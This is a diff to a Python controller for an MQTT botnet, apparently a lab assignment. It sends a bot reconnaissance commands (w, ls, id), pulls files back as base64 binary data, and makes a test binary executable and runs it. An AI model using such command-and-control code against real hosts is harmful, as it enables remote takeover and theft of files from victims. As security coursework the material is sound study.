@@ -1,3 +1,4 @@
+import base64
 import time
 import paho.mqtt.client as mqtt
 from consts import *
@@ -8,14 +9,17 @@ def on_message(client, userdata, msg):
     payload = msg.payload.decode()
     if payload.startswith(f"{BOT_ID}_RES:"):
         clean_payload = payload.replace(f"{BOT_ID}_RES: ", "")
-        # Check if the response contains file data
-        if clean_payload.startswith("FILE_DATA:"):
-            _, filename, content = clean_payload.split(":", 2)
-            with open(f"downloaded_{filename}", "w") as f:
-                f.write(content)
-            print(f"[SYSTEM]: File {filename} copied and saved as downloaded_{filename}")
-        else:
-            print(f"[BOT RESPONSE]: {clean_payload}")
+
+        # 1. Handle Binary File Copy (Requirement 5.5)
+        if "FILE_B64:" in clean_payload:
+            try:
+                # Based on your bot's format: FILE_B64:filename:data
+                _, filename, b64data = clean_payload.split(":", 2)
+                with open(f"copied_{filename}", "wb") as f:
+                    f.write(base64.b64decode(b64data))
+                print(f"[SYSTEM]: Successfully copied binary file: {filename}")
+            except Exception as e:
+                print(f"[SYSTEM]: Error decoding binary file: {e}")
 
 if __name__ == '__main__':
     client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
@@ -38,7 +42,7 @@ if __name__ == '__main__':
                     CMD_WHO_IS_LOGGED_IN, # w, requirement 5.2
                     CMD_LIST_FILES, # ls, requirement 5.3
                     CMD_ID_HOST, # id, requirement 5.4
-                    CMD_COPY_FROM_BOT_TO_CONTROLLER + "fileToCopy.txt",  # requirement 5.5
+                    CMD_COPY_FROM_BOT_TO_CONTROLLER + " fileToCopy.txt",  # requirement 5.5
                     CMD_CHMOD_TEST_BINARY, # requirement 5.6
                     CMD_RUN_TEST_BINARY # requirement 5.6
                 ]
